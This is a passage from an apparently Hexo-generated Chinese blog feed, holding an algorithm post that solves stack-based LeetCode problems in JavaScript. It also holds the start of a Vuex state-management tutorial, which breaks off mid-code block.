class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法-栈</title>
      <link href="2020/10/22/%E7%AE%97%E6%B3%95-%E6%A0%88/"/>
      <url>2020/10/22/%E7%AE%97%E6%B3%95-%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<ul><li>括号匹配问题</li><li>表现良好的最长时间段</li><li>买卖股票的最佳时机</li><li>字符串解码</li><li>去除重复字母</li><li>移掉 k 位数字</li></ul><a id="more"></a><h2 id="括号匹配问题"><a href="#括号匹配问题" class="headerlink" title="括号匹配问题"></a>括号匹配问题</h2><p>大致思路是遇到左括号入栈，遇到右括号将左括号出栈，复杂度为O(n)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isBalanced</span>(<span class="params">exp</span>)</span>&#123;</span><br><span class="line"><span class="keyword">let</span> info = exp.split(<span class="string">""</span>);</span><br><span class="line"><span class="keyword">let</span> stack = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; info.length; ++i)&#123;</span><br><span class="line"><span class="keyword">let</span> el = info[i];</span><br><span class="line"><span class="keyword">if</span>(el == <span class="string">"&#123;"</span>)&#123;</span><br><span class="line">stack.push(<span class="string">"&#123;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(el == <span class="string">"&#125;"</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(stack.length === <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">stack.pop();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> stack.length === <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们还可以把题目再向前面推进一步，如果包含三种括号怎么办：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isValid = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">        [<span class="string">"&#125;"</span>,<span class="string">"&#123;"</span>],</span><br><span class="line">        [<span class="string">")"</span>,<span class="string">"("</span>],</span><br><span class="line">        [<span class="string">"]"</span>,<span class="string">"["</span>]</span><br><span class="line">    ])</span><br><span class="line">    <span class="keyword">let</span> stack = []</span><br><span class="line">    <span class="keyword">let</span> str = s.split(<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> str)&#123;</span><br><span class="line">        <span class="comment">// 判断是否为左括号</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="regexp">/(\(|\[|\&#123;)/</span>.test(str[i]))&#123;</span><br><span class="line">            stack.push(str[i])</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(stack.length===<span class="number">0</span>||stack[stack.length<span class="number">-1</span>]!==map.get(str[i]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                stack.pop()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stack.length === <span class="number">0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="表现良好的最长时间段"><a href="#表现良好的最长时间段" class="headerlink" title="表现良好的最长时间段"></a>表现良好的最长时间段</h2><p><a href="https://leetcode-cn.com/problems/longest-well-performing-interval/" target="_blank" rel="noopener">leetcode1124</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">给你一份工作时间表 hours，上面记录着某一位员工每天的工作小时数。</span><br><span class="line">我们认为当员工一天中的工作小时数大于 8 小时的时候，那么这一天就是「劳累的一天」。</span><br><span class="line">所谓「表现良好的时间段」，意味在这段时间内，「劳累的天数」是严格 大于「不劳累的天数」。</span><br><span class="line">请你返回「表现良好时间段」的最大长度。</span><br><span class="line"></span><br><span class="line">输入：hours = [9,9,6,0,6,6,9]</span><br><span class="line">输出：3</span><br><span class="line">解释：最长的表现良好时间段是 [9,9,6]。</span><br></pre></td></tr></table></figure><h3 id="前置知识：前缀和，单调栈"><a href="#前置知识：前缀和，单调栈" class="headerlink" title="前置知识：前缀和，单调栈"></a>前置知识：前缀和，单调栈</h3><ul><li>数组转换并计算前缀和</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hours = [<span class="number">9</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">9</span>]</span><br><span class="line">score = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">1</span>] <span class="comment">// 大于8记1，小于8记-1</span></span><br><span class="line">presum = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-2</span>, <span class="number">-1</span>] <span class="comment">// 前缀和</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// presum[j] - presum[i] 代表的是 score[i] 到 score[j-1] 的区间元素和</span></span><br></pre></td></tr></table></figure><ul><li>单调栈：就是栈中元素,按递增顺序或者递减顺序排列，最大好处就是时间复杂度是线性的,每个元素遍历一次</li><li>单调递增栈可以找到左起第一个比当前数字小的元素</li><li>比如数组:<code>[3,5,4,1]</code>,我们如何要找每一个元素下一个最小数.例如:<code>3</code> 下一个最小的数为<code>1</code>,<code>5</code>下一个是<code>4</code>.我们先构造栈,把<code>3</code>压入栈中,<code>5</code>入栈时候,发现栈顶元素<code>3</code>比它小,也依次压入;当<code>4</code>时候,栈顶元素<code>5</code>大于<code>4</code>,于是得到,<code>5</code><strong>左起第一个小的元素</strong>为<code>4</code>.将<code>5</code>弹出,压入<code>4</code>.接下来元素<code>1</code>,也比栈顶元素小,于是得到<code>4</code>第一个小的元素为<code>1</code>,弹出<code>4</code>,依次类推,<code>3</code>也是<code>1</code>…栈中的元素<strong>一直保持单调递增的状态</strong>.</li></ul><hr><h3 id="回归题目"><a href="#回归题目" class="headerlink" title="回归题目"></a>回归题目</h3><ul><li>我们要找的是：一个最长的区间 能使 score的区间元素和大于 0</li><li>有了前缀和就变成了：寻找最长的区间使得 presum[j] - presum[i] &gt;0”</li><li>以任意元素presum[i]为起始点，找最右边往左找第一个满足presum[j]大于presum[i]的元素下标A[j]，找(j – i)的最大值，即最大区间。那么可以按照元素从左到右建单调递减的栈，然后从右到左找满足要求的最区间。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; hours</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> longestWPI = <span class="function"><span class="keyword">function</span>(<span class="params">hours</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 转换成: [1,  1, -1, -1, -1, -1, 1]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> hours) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hours[i] &gt; <span class="number">8</span>) &#123;</span><br><span class="line">            hours[i] = <span class="number">1</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            hours[i] = <span class="number">-1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 求前缀和: [0, 1, 2, 1, 0, -1, -2, -1]</span></span><br><span class="line">    <span class="keyword">let</span> presum = []</span><br><span class="line">    presum[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>;i &lt;= hours.length;i++) &#123;</span><br><span class="line">        presum[i] = presum[i<span class="number">-1</span>] + hours[i<span class="number">-1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 构造单调递减栈：存储的是索引 [0, 5, 6]，对应前缀和中的 [0, -1, -2]</span></span><br><span class="line">    <span class="comment">// 我们最后要求的最大的宽度坡一定是以这个序列中的某一个i为坡底的(自己理解一下)</span></span><br><span class="line">    <span class="comment">// 最大宽度坡：假设存在某个元素位置k不存在于上面的递减序列中，且有最大宽度j-k，</span></span><br><span class="line">    <span class="comment">// 这也就说明k位置的元素一定是小于k前面所有的元素的，否则就会有更长的宽度，但是既然k小于前面所有的元素，</span></span><br><span class="line">    <span class="comment">// 那么k就一定会被加入到序列中，与假设矛盾，所以不存在k，解一定存在递减序列中</span></span><br><span class="line">    <span class="keyword">let</span> stack = []</span><br><span class="line">    stack[<span class="number">0</span>] = presum[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>;i &lt; presum.length;i++) &#123;</span><br><span class="line">        <span class="comment">// 小于栈顶则 push</span></span><br><span class="line">        <span class="keyword">if</span> (presum[i] &lt; presum[stack[stack.length - <span class="number">1</span>]]) &#123;</span><br><span class="line">            stack.push(i)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//  从尾部遍历presum</span></span><br><span class="line">    <span class="comment">//  如果该位置元素比stack中存储的位置的元素高，则表明为上坡路</span></span><br><span class="line">    <span class="comment">//  弹出栈顶元素（因为再往前遍历长度会减小），并记录坐标差，该坐标差即为上坡路的长度</span></span><br><span class="line">    <span class="keyword">let</span> ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = presum.length - <span class="number">1</span>;i &gt; ans;i--)&#123;</span><br><span class="line">        <span class="comment">// 注意此处是 while，满足条件 pop 之后会继续比较</span></span><br><span class="line">        <span class="keyword">while</span>(stack.length &gt; <span class="number">0</span> &amp;&amp; presum[i] &gt; presum[stack[stack.length - <span class="number">1</span>]])&#123;</span><br><span class="line">            ans = <span class="built_in">Math</span>.max(ans, i - stack.pop())</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>类似题目：<a href="https://leetcode-cn.com/problems/maximum-width-ramp/" target="_blank" rel="noopener">leetcode962:最大宽度坡</a></p><h2 id="买卖股票的最佳时机"><a href="#买卖股票的最佳时机" class="headerlink" title="买卖股票的最佳时机"></a>买卖股票的最佳时机</h2><ul><li><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/" target="_blank" rel="noopener">leetcode121</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。</span><br><span class="line">如果你最多只允许完成一笔交易（即买入和卖出一支股票一次），设计一个算法来计算你所能获取的最大利润。</span><br><span class="line">注意：你不能在买入股票前卖出股票。</span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line">输入: [7,1,5,3,6,4]</span><br><span class="line">输出: 5</span><br><span class="line">解释: 在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。</span><br><span class="line">     注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。</span><br><span class="line">     </span><br><span class="line">示例 2:</span><br><span class="line">输入: [7,6,4,3,1]</span><br><span class="line">输出: 0</span><br><span class="line">解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。</span><br></pre></td></tr></table></figure><ul><li>构造单调递减栈：最优解的起始值必是单调栈中的</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stack = []</span><br><span class="line">    stack[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (prices[i] &lt; prices[stack[stack.length<span class="number">-1</span>]]) &#123;</span><br><span class="line">            stack.push(i)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (stack.length &gt; <span class="number">0</span> &amp;&amp; stack.length &lt; prices.length) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = stack.pop()</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = prices.length<span class="number">-1</span>; i &gt; tmp; i--) &#123;</span><br><span class="line">            ans = <span class="built_in">Math</span>.max(ans, prices[i] - prices[tmp])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="字符串解码"><a href="#字符串解码" class="headerlink" title="字符串解码"></a>字符串解码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">示例 1：</span><br><span class="line">输入：s = &quot;3[a]2[bc]&quot;</span><br><span class="line">输出：&quot;aaabcbc&quot;</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：s = &quot;3[a2[c]]&quot;</span><br><span class="line">输出：&quot;accaccacc&quot;</span><br><span class="line"></span><br><span class="line">示例 3：</span><br><span class="line">输入：s = &quot;2[abc]3[cd]ef&quot;</span><br><span class="line">输出：&quot;abcabccdcdcdef&quot;</span><br><span class="line"></span><br><span class="line">示例 4：</span><br><span class="line">输入：s = &quot;abc3[cd]xyz&quot;</span><br><span class="line">输出：&quot;abccdcdcdxyz&quot;</span><br></pre></td></tr></table></figure><ul><li>题目来源：<a href="https://leetcode-cn.com/problems/decode-string/" target="_blank" rel="noopener">leetcode394</a></li><li>正则解法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">decodeString(s) &#123;</span><br><span class="line">     <span class="keyword">let</span> reg = <span class="regexp">/(\d+)\[(\w+)\]/g</span></span><br><span class="line">     <span class="keyword">while</span> (reg.test(s)) &#123;</span><br><span class="line">       <span class="comment">// replace 第二个参数可以为函数</span></span><br><span class="line">       <span class="comment">// 参数：匹配到的，$1，$2，索引，源字符串</span></span><br><span class="line">       s = s.replace(reg, <span class="function"><span class="keyword">function</span>(<span class="params">matchStr, group1, group2, index, sourceStr</span>) </span>&#123;</span><br><span class="line">         <span class="keyword">let</span> str = <span class="string">""</span></span><br><span class="line">         <span class="keyword">while</span>(group1--) &#123;</span><br><span class="line">           str +=  group2</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> str;</span><br><span class="line">       &#125;)</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">console</span>.log(s)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="去除重复字母"><a href="#去除重复字母" class="headerlink" title="去除重复字母"></a>去除重复字母</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">给你一个字符串 s ，请你去除字符串中重复的字母，使得每个字母只出现一次。需保证 返回结果的字典序最小（要求不能打乱其他字符的相对位置）。 </span><br><span class="line"></span><br><span class="line">示例 1：</span><br><span class="line">输入：s = &quot;bcabc&quot;</span><br><span class="line">输出：&quot;abc&quot;</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：s = &quot;cbacdcbc&quot;</span><br><span class="line">输出：&quot;acdb&quot;</span><br></pre></td></tr></table></figure><h2 id="移掉-k-位数字"><a href="#移掉-k-位数字" class="headerlink" title="移掉 k 位数字"></a>移掉 k 位数字</h2><ul><li>题目：<a href="https://leetcode-cn.com/problems/remove-k-digits" target="_blank" rel="noopener">leetcode402</a></li><li>可参考：<a href="https://leetcode-cn.com/problems/remove-k-digits/solution/yi-zhao-chi-bian-li-kou-si-dao-ti-ma-ma-zai-ye-b-5/" target="_blank" rel="noopener">一招吃遍力扣四道题，妈妈再也不用担心我被套路啦～</a></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">给定一个以字符串表示的非负整数 num，移除这个数中的 k 位数字，使得剩下的数字最小。</span><br><span class="line"></span><br><span class="line">注意:</span><br><span class="line">num 的长度小于 <span class="number">10002</span> 且 ≥ k。</span><br><span class="line">num 不会包含任何前导零。</span><br><span class="line"></span><br><span class="line">示例 <span class="number">1</span> :</span><br><span class="line">输入: num = <span class="string">"1432219"</span>, k = <span class="number">3</span></span><br><span class="line">输出: <span class="string">"1219"</span></span><br><span class="line">解释: 移除掉三个数字 <span class="number">4</span>, <span class="number">3</span>, 和 <span class="number">2</span> 形成一个新的最小的数字 <span class="number">1219</span>。</span><br><span class="line"></span><br><span class="line">示例 <span class="number">2</span> :</span><br><span class="line">输入: num = <span class="string">"10200"</span>, k = <span class="number">1</span></span><br><span class="line">输出: <span class="string">"200"</span></span><br><span class="line">解释: 移掉首位的 <span class="number">1</span> 剩下的数字为 <span class="number">200.</span> 注意输出不能有任何前导零。</span><br><span class="line"></span><br><span class="line">示例 <span class="number">3</span> :</span><br><span class="line">输入: num = <span class="string">"10"</span>, k = <span class="number">2</span></span><br><span class="line">输出: <span class="string">"0"</span></span><br><span class="line">解释: 从原数字移除所有的数字，剩余为空就是<span class="number">0</span>。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">给定一个数字序列，例如 425，如果要求我们只删除一个数字，那么从左到右，我们有 4、2 和 5 三个选择。我们将每一个数字和它的左邻居进行比较。从 2 开始，小于它的左邻居 4。则我们应该去掉数字 4。如果不这么做，则随后无论做什么，都不会得到最小数。</span><br><span class="line"></span><br><span class="line">如果我们保留数字 4，那么所有可能的组合都是以数字 4（即 42，45）开头的。相反，如果去掉 4，留下 2，我们得到的是以 2 开头的组合（即 25），这明显小于任何留下数字 4 的组合。</span><br><span class="line"></span><br><span class="line">这个问题可以用贪心算法来解决。上述规则阐明了我们如何接近最终答案的基本逻辑。一旦我们从序列中删除一个数字，剩下的数字就形成了一个新的问题，我们可以继续使用这个规则。</span><br></pre></td></tr></table></figure><ul><li>思路：从左向右遍历入栈，若下一个数更小，则上一个数出栈。</li><li>问题： num 是一个增序序列，则不会出栈；是一个降序序列，则会一直出栈。</li><li><p>解决：</p><ul><li>每次丢弃一次，k 减去 1。当 k 减到 0 ，我们可以提前终止遍历。</li><li>而当遍历完成，如果 k 仍然大于 0。不妨假设最终还剩下 x 个需要丢弃，那么我们需要选择删除末尾 x 个元素。</li></ul></li><li><p>若输入为(“1234567890”, 9)，按照以上逻辑最后输出的 stack 为 [1,2,3,4,5,6,7,8,0]，所以要设置 while 循环，当 num[i] 一直比栈顶元素小时，则继续出栈</p></li><li>保证数字范围使用 BigInt</li><li>若 num.length === k，说明全部删除，直接返回 “0”</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeKdigits</span>(<span class="params">num, k</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stack = []</span><br><span class="line">    <span class="keyword">let</span> n = k</span><br><span class="line">    <span class="keyword">if</span> (num.length === k) <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; num.length; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (n &amp;&amp; num[i] &lt; stack[stack.length - <span class="number">1</span>]) &#123;</span><br><span class="line">            stack.pop()</span><br><span class="line">            n--</span><br><span class="line">        &#125;</span><br><span class="line">        stack.push(num[i])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (BigInt(stack.join(<span class="string">""</span>)) + <span class="string">""</span>).slice(<span class="number">0</span>, num.length - k)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vuex</title>
      <link href="2020/10/22/%E6%95%B4%E7%90%86-Vuex/"/>
      <url>2020/10/22/%E6%95%B4%E7%90%86-Vuex/</url>
      
        <content type="html"><![CDATA[<ul><li>什么是 Vuex</li><li>核心概念</li><li>vue-devtools</li><li>模拟 Vuex</li></ul><a id="more"></a><h2 id="什么是-Vuex"><a href="#什么是-Vuex" class="headerlink" title="什么是 Vuex"></a>什么是 Vuex</h2><ul><li>Vuex 是专门为 Vue.js 设计的状态管理库</li><li>它采用集中式的方式存储需要共享的数据</li><li>从使用角度，它就是一个 JavaScript 库</li><li>它的作用是进行状态管理，解决复杂组件通信，数据共享</li><li>如果不打算开发大型单页应用，使用 Vuex 可能是繁琐冗余的。</li><li><a href="https://vuex.vuejs.org/zh/" target="_blank" rel="noopener">官网</a></li></ul><p><img src="https://vuex.vuejs.org/vuex.png" alt="1"></p><h2 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><p>每一个 Vuex 应用的核心就是 store（仓库）。“store”基本上就是一个容器，它包含着你的应用中大部分的<strong>状态 (state)</strong>。Vuex 和单纯的全局对象有以下两点不同：</p><ol><li>Vuex 的状态存储是响应式的。当 Vue 组件从 store 中读取状态的时候，若 store 中的状态发生变化，那么相应的组件也会相应地得到高效更新。</li><li>你不能直接改变 store 中的状态。改变 store 中的状态的唯一途径就是显式地<strong>提交 (commit) mutation</strong>。这样使得我们可以方便地跟踪每一个状态的变化，从而让我们能够实现一些工具帮助我们更好地了解我们的应用。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"></span><br><span class="line">Vue.use(Vuex);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    increment (state) &#123;</span><br><span class="line">      state.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li><p>State：<strong>单一状态树</strong>，用一个对象就包含了全部的应用层级状态。它作为一个“唯一数据源”而存在。</p></li><li><p>Getter：Vuex 允许我们在 store 中定义“getter”（可以认为是 store 的计算属性）。就像计算属性一样，getter 的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。</p></li><li><p>Mutation：更改 Vuex 的 store 中的状态的唯一方法是提交 mutation</p><ul><li><p>你可以向 <code>store.commit</code> 传入额外的参数，即 mutation 的 <strong>载荷（payload）</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">mutations: &#123;</span><br><span class="line">  increment (state, n) &#123;</span><br><span class="line">    state.count += n</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">store.commit(<span class="string">'increment'</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure></li><li><p>使用常量替代 mutation 事件类型在各种 Flux 实现中是很常见的模式。这样可以使 linter 之类的工具发挥作用，同时把这些常量放在单独的文件中可以让你的代码合作者对整个 app 包含的 mutation 一目了然：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 